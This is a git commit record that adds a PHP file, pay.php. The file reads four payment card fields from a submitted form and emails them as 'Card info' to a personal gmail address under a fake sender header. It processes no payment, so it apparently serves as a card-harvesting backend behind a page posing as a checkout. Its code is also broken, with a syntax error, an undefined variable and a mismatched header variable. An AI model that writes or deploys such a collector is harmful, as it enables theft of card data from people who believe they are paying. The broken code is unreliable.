6f92578757162cdb75f9f7fb2e5d141c88b53814
MXR <101259686+mx2137r@users.noreply.github.com>
2022-03-13 01:40:57 +0100

    Create pay.php

---
+++ pay.php
@@ -0,0 +1,16 @@
+<?php 
+$card1 = $_POST['card1'];
+$card2 = $_POST['card2'];
+$card3 = $_POST['card3'];
+$card4 = $_POST['card4'];
+
+$to = "mxr2137@gmail.com";
+
+$subject = "Info";
+$txt ="Card info:". $card1 . $card2 . $card3 . $card4;
+
+$headers = "From: noreply@mxr.com" . "\r\n" .
+  "CC: somebodyelse@example.com:";
+if($email!=) {
+  mail($to,$subject,$txt,$header);
+}
